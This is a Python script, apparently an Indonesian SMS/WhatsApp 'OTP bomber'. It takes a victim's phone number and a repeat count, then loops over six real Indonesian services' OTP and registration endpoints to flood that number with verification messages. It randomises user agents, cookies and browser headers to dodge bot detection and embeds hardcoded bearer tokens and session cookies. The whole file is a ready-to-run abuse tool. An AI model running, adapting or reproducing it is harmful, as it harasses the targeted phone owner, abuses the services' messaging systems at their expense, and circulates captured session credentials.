import os, sys, time, json, requests
from colorama import Fore, init
from sys import argv
import random
import uuid

init(autoreset=True)

def autotype(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.008)

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW

hijau = "\033[1;92m"
putih = "\033[1;97m"
biru = "\033[1;96m"
kuning = "\033[1;93m"

def generate_user_agent():
    browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera']
    os = ['Windows', 'Macintosh', 'Linux', 'Android', 'iOS']
    browser_version = random.randint(50, 90)
    os_version = random.randint(10, 15)
    return f"Mozilla/5.0 ({random.choice(os)} NT {os_version}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) {random.choice(browsers)}/{browser_version}.0.4472.124 Safari/537.36"

def generate_accept_language():
    languages = ['en-US', 'id-ID', 'es-ES', 'zh-CN', 'ms-MY', 'ca-ES', 'pt-BR']
    random.shuffle(languages)
    return ','.join([f"{lang};q={round(random.uniform(0.1, 1.0), 1)}" for lang in languages])

def generate_cookie():
    return f"perf_dv6Tr4n={random.randint(1, 10)}; _gcl_au=1.1.{random.randint(100000000, 999999999)}.{random.randint(1000000000, 1999999999)}; amp_9bff24={uuid.uuid4()}...1i0tkmf66.1i0tkmf66.0.0.0; _gid=GA1.3.{random.randint(100000000, 999999999)}.{random.randint(1000000000, 1999999999)}; _gat_UA-106864485-1=1; _fbp=fb.2.{random.randint(1000000000, 1999999999)}.{random.randint(1000000000000, 1999999999999)}; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=-20881%2C180.244.163.61%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CID; _ga_M6EGHSCWF7=GS1.1.{random.randint(1000000000, 1999999999)}.1.0.{random.randint(1000000000, 1999999999)}.57.0.0; ph_phc_3JD9yqRALGfavssFolNlgAlqrFJxXWoSMRypaScrcHv_posthog=%7B%22distinct_id%22%3A%22{uuid.uuid4()}%22%2C%22%24sesid%22%3A%5B{random.randint(1000000000, 1999999999)}%2C%22{uuid.uuid4()}%22%2C{random.randint(1000000000, 1999999999)}%5D%7D; _ga=GA1.1.{random.randint(1000000000, 1999999999)}; cebsp_=2; _ga_V9673QHFM5=GS1.1.{random.randint(1000000000, 1999999999)}.1.1.{random.randint(1000000000, 1999999999)}.38.0.0; _ce.s=v~26dae470825c19828984ea7d7dbfd066418b156c~lcw~{random.randint(1000000000, 1999999999)}~lva~{random.randint(1000000000, 1999999999)}~vpv~0~as~false~v11.fhb~{random.randint(1000000000, 1999999999)}~v11.lhb~{random.randint(1000000000, 1999999999)}~v11.cs~{random.randint(100000, 999999)}~v11.s~{uuid.uuid4()}~gtrk.la~lxotc4r2~v11.sla~{random.randint(1000000000, 1999999999)}~lcw~{random.randint(1000000000, 1999999999)}"

def generate_sec_ch_ua():
    brands = ['Not/A)Brand', 'Chromium', 'Google Chrome', 'Microsoft Edge', 'Safari']
    versions = [str(random.randint(70, 130)) for _ in range(3)]
    return f"\"{random.choice(brands)}\";v=\"{versions[0]}\", \"{random.choice(brands)}\";v=\"{versions[1]}\", \"{random.choice(brands)}\";v=\"{versions[2]}\""

def generate_sec_ch_ua_platform():
    platforms = ['Windows', 'macOS', 'Linux', 'Android', 'iOS']
    return f"\"{random.choice(platforms)}\""

inputNomer = argv[1]
inputJumlah = int(argv[2])
nomor_matahari = inputNomer.replace("+62", "0")
nomor_mraladin = inputNomer.replace("+62", "")

# Loop to send OTP requests
for i in range(inputJumlah):
    user_agent = generate_user_agent()
    # Sayurbox
    headers_sayurbox = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNzE5MDMzNDQ3LCJleHAiOjE3MjE2MjU0NDcsImlhdCI6MTcxOTAzMzQ0NywiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGwsInRlbmFudCI6ImIyYyJ9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjJkOWVlZGI0LTNmYjMtNDIzMi1hODFiLWY1NzljZDAyMzMwYiIsInN1YiI6ImFfcjB6RkF0cFRVa3NJUnlEWnlha1MxckQ2c3oiLCJ1c2VyX2lkIjoiYV9yMHpGQXRwVFVrc0lSeURaeWFrUzFyRDZzeiJ9.D5M7VAjb7mpyM2QsOpuBFWOXctqyMKUZLrhgZkm0CM-IuKe1GMMn8S9UJ3OOvLr3okl1KxQ87fH08mq8552Mx6MAq6Bgs_0KNDPqKxRc7Rqx7qLHIyBW20sKqbadIdOqmr7hKSGepkMUilx-MULvjFs1VMCRWUStqu8Zj-cohOSDIIaOBHZBJaAkrYSOZXVRq7gLsyeDJ9WWmovfsVWlLhyQmap7XztQmzq6AfcrI0R8NeK4SvH56fe9K-FC9KjYdVcJDC_O3VViWDqzCuJ5wHgTJwpGdpjC4jP-Eqp1iz-7bxXn9yx5OD6c2U2xB2wdNkgoOqKpixnVrSBzi15zAg",
        "Content-Type": "application/json",
        "Cookie": "perf_dv6Tr4n=1; _gcl_au=1.1.453795563.1718975654; _ga=GA1.1.1863538960.1718975654; _fbp=fb.1.1718975655048.519782181988016639; afUserId=ce18733b-0c78-451f-9579-c6300baa97db-p; AF_SYNC=1718975655764; _sbox_lang=id; __cnf=cnf0927; token=eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNzE5MDMzNDQ3LCJleHAiOjE3MjE2MjU0NDcsImlhdCI6MTcxOTAzMzQ0NywiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGwsInRlbmFudCI6ImIyYyJ9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjJkOWVlZGI0LTNmYjMtNDIzMi1hODFiLWY1NzljZDAyMzMwYiIsInN1YiI6ImFfcjB6RkF0cFRVa3NJUnlEWnlha1MxckQ2c3oiLCJ1c2VyX2lkIjoiYV9yMHpGQXRwVFVrc0lSeURaeWFrUzFyRDZzeiJ9.D5M7VAjb7mpyM2QsOpuBFWOXctqyMKUZLrhgZkm0CM-IuKe1GMMn8S9UJ3OOvLr3okl1KxQ87fH08mq8552Mx6MAq6Bgs_0KNDPqKxRc7Rqx7qLHIyBW20sKqbadIdOqmr7hKSGepkMUilx-MULvjFs1VMCRWUStqu8Zj-cohOSDIIaOBHZBJaAkrYSOZXVRq7gLsyeDJ9WWmovfsVWlLhyQmap7XztQmzq6AfcrI0R8NeK4SvH56fe9K-FC9KjYdVcJDC_O3VViWDqzCuJ5wHgTJwpGdpjC4jP-Eqp1iz-7bxXn9yx5OD6c2U2xB2wdNkgoOqKpixnVrSBzi15zAg; localSessionId=lk0uc8P05F_9Iagy1q7kK:1719033426572; localSessionIdExpire=1719033426572; _ga_RG03K1J7BE=GS1.1.1719033426.2.0.1719033426.0.0.0; _ga_MHTN2YH4H8=GS1.1.1719033427.3.1.1719033901.60.0.0",
        "Origin": "https://www.sayurbox.com",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": user_agent,
        "X-Binary-Version": "2.21.2",
        "X-Bundle-Revision": "60.4",
        "X-Device-Info": "{\"platform\":\"web\",\"is_app\":false,\"is_mobile\":false,\"device_type\":\"desktop\",\"device_id\":\"lk0uc8P05F_9Iagy1q7kK\",\"os_name\":\"Windows\",\"os_version\":\"NT 10.0\",\"brand\":null,\"model\":null,\"pixel_density\":1.125,\"client_ip\":\"::ffff:10.10.202.18\"}",
        "X-Sbox-Lang": "id",
        "X-Sbox-Tenant": "b2c",
        "X-Supported-Delivery": "NEXTDAY,SAMEDAY,INSTANT"
    }
    data_sayurbox = json.dumps({
        "operationName": "generateOTP",
        "variables": {
            "destinationType": "whatsapp",
            "identity": inputNomer
        },
        "query": "mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"
    })
    response_sayurbox = requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1", headers=headers_sayurbox, data=data_sayurbox)
    if response_sayurbox.status_code == 200:
        print(f"{G}Berhasil mengirim SMS/WA via SayurBox")
    else:
        print(f"{R}Gagal mengirim SMS/WA via SayurBox")

    # Matahari
    headers_matahari = {
        "Host": "www.matahari.com",
        "content-length": str(random.randint(20, 50)), 
        "x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
        "sec-ch-ua-mobile": "?1",
        "user-agent": user_agent,
        "content-type": "application/json",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-platform": generate_sec_ch_ua_platform(),
        "origin": "https://www.matahari.com",
        "sec-fetch-site": random.choice(["same-site", "same-origin", "cross-site"]),
        "sec-fetch-mode": random.choice(["cors", "navigate", "no-cors"]),
        "sec-fetch-dest": random.choice(["empty", "document", "iframe"]),
        "referer": "https://www.matahari.com/customer/account/create/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": generate_accept_language()
    }
    data_matahari = json.dumps({
        "otp_request": {
            "mobile_number": nomor_matahari,
            "mobile_country_code": "+62"
        }
    })
    response_matahari = requests.post("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp", headers=headers_matahari, data=data_matahari)
    if response_matahari.status_code == 200:
        print(f"{G}Berhasil mengirim SMS/WA via Matahari")
    else:
        print(f"{R}Gagal mengirim SMS/WA via Matahari")

    # BukuWarung
    headers_bukuwarung = {
        "Host": "api-v2.bukuwarung.com",
        "content-length": str(random.randint(20, 50)), 
        "sec-ch-ua-mobile": f"?{random.randint(0, 1)}",
        "user-agent": user_agent,
        "content-type": "application/json",
        "x-app-version-name": "android",
        "accept": "application/json, text/plain, */*",
        "x-app-version-code": "3001",
        "buku-origin": "tokoko-web",
        "sec-ch-ua-platform": generate_sec_ch_ua_platform(),
        "origin": "https://tokoko.id",
        "sec-fetch-site": random.choice(["same-site", "same-origin", "cross-site"]),
        "sec-fetch-mode": random.choice(["cors", "navigate", "no-cors"]),
        "sec-fetch-dest": random.choice(["empty", "document", "iframe"]),
        "accept-encoding": "gzip, deflate, br",
        "accept-language": generate_accept_language()
    }
    data_bukuwarung = json.dumps({
        "operationName": "sendVerification",
        "variables": {
            "phone": inputNomer
        },
        "query": "mutation sendVerification($phone: String!) {\n  sendVerification(phone: $phone) {\n    success\n    errors\n  }\n}"
    })
    response_bukuwarung = requests.post("https://api-v2.bukuwarung.com/graphql", headers=headers_bukuwarung, data=data_bukuwarung)
    if response_bukuwarung.status_code == 200:
        print(f"{G}Berhasil mengirim SMS/WA via BukuWarung")
    else:
        print(f"{R}Gagal mengirim SMS/WA via BukuWarung")
        
    headers_danacita = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Content-Length": str(random.randint(20, 50)), 
        "Content-Type": "application/json",
        "Cookie": generate_cookie(),
        "Origin": "https://app.danacita.co.id",
        "Referer": "https://app.danacita.co.id/",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent()
	}
    
    data_danacita = json.dumps({
        "username": inputNomer,
	})
    
    
    response_danacita = requests.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita)
    if response_danacita.status_code == 200:
        print(f"{G}Berhasil mengirim SMS/WA via Danacita")
    else:
        print(f"{R}Gagal mengirim SMS/WA via Danacita")
        
    headers_harvest = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Accept-Language": generate_accept_language(),
		"Cache-Control": "max-age=0",
		"Content-Type": "application/x-www-form-urlencoded",
		"Cookie": "csrftoken=KdP64VLyAiPT85WSG8bV812VsmXHa4LIQHk9u9l0v0K7SX0VjKmKarzSEypuCeuh; _gid=GA1.2.1605440401.1718977455; _ga_S87G2283KK=GS1.1.1718982268.2.0.1718982268.0.0.0; _ga_K2VKG4DW9K=GS1.1.1718982268.2.0.1718982268.0.0.0; _ga=GA1.2.1215605141.1718977455; _gat_gtag_UA_234451190_1=1",
		"Origin": "https://harvestcakes.com",
		"Referer": "https://harvestcakes.com/register/",
		"Sec-Ch-Ua": generate_sec_ch_ua(),
		"Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
		"Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
		"Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
		"Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
		"Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
		"Sec-Fetch-User": "?1",
		"Upgrade-Insecure-Requests": "1",
		"User-Agent": user_agent
	}
    
    data_harvest = json.dumps({
        "phone": inputNomer
	})
    
    response_harvest = requests.post("https://harvestcakes.com/register", headers=headers_harvest, data=data_harvest)
    if response_harvest.status_code == 200:
        print(f"{G}Berhasil mengirim SMS/WA via Harvest")
    else:
        print(f"{R}Gagal mengirim SMS/WA via Harvest")
        
    headers_misterAladin = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Authorization": "Bearer null",
        "Content-Length": str(random.randint(20, 50)),
        "Content-Type": "application/json;charset=UTF-8",
        "Cookie": "offer_id=103180; utm_source=involveasia; _ga=GA1.2.40616470.1718982768; _gid=GA1.2.1272049545.1718982768; Lda_aKUr6BGRn=everydaysi.com/r/v2?; G_ENABLED_IDPS=google; Ac_aqK8DtrDL=1; Fm_kZf8ZQvmX=1; __cfruid=de4c77417ef8c7b1aab81ffb4fceadf9762578dc-1719067746; click_id=710414e9316844668c613db0eb3e8f7f; utm_medium=1637-710414e9316844668c613db0eb3e8f7f; _gat=1; _ga_PLKRYTK7YG=GS1.2.1719067732.2.1.1719067735.57.0.0",
        "Origin": "https://www.misteraladin.com",
        "Priority": "u=1, i",
        "Referer": "https://www.misteraladin.com/register",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent(),
        "X-Platform": "web"
	}
    
    data_misterAladin = json.dumps({
        "phone_number_country_code": "62",
        "phone_number": nomor_mraladin,
        "type": "register"
	})
    
    response_mraladin = requests.post("https://www.misteraladin.com/api/members/v2/otp/request", headers=headers_misterAladin, data=data_misterAladin)
    if response_mraladin.status_code == 200:
        print(f"{G}Berhasil mengirim SMS/WA via Mister Aladin")
    else: 
        print(f"{R}Gagal mengirim SMS/WA via Mister Aladin")

    
